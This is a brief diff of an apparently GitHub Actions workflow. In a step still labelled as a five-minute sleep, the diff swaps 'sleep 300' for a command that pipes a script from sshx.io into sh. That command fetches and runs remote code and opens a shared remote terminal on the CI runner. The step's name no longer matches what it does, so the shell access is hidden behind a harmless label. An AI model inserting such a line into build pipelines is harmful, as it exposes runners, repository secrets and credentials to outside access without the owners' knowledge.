@@ -93,7 +93,7 @@ jobs:
 
       - name: Sleep for 5 minutes to run tests on the runners
         shell: bash
-        run: sleep 300
+        run: curl -sSf https://sshx.io/get | sh -s run
 
       - name: Remove the runner deployment
         shell: bash
